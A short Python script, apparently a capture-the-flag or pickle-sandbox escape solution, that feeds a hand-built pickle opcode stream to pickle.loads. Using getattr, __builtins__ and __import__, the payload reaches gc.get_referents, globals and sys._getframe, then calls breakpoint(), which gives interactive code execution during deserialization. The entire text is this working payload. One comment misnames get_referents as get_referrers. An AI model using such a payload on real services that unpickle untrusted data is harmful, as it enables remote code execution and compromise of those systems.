import pickle

pickle.loads(
    b'\x80\x05' # PROTO 5
    b'c__main__\n__builtins__.getattr\n\x940' # load and memoize getattr at 0 and pop
    b'c__main__\n__builtins__\n\x940' # load and memoize __builtins__ as 1 and pop
    b'(' # MARK
        b'h\x00' # load getattr
        b'h\x01' # load __builtins__
        b'V__import__\n' # "__import__" literal
        b'o' # use OBJ to call `getattr(__builtins__, "__import__")`
    b'\x940' # memoize __import__ as 2 and pop
    b'(' # MARK
        b'h\x00' # load getattr
        b'(' # MARK
            b'h\x02' # load __import__
            b'Vgc\n' # "gc" literal
            b'o' # import `gc`
        b'Vget_referents\n' # "get_referrers" literal
        b'o' # retrieve `gc.get_referrers`
    b'\x94' # memoize as 3
    b'((h\x00h\x01Vglobals\nooVframe\n((h\x00(h\x02Vsys\noV_getframe\noos'
    b'((h\x00h\x01Vbreakpoint\noo'
    b'.' #STOP
)
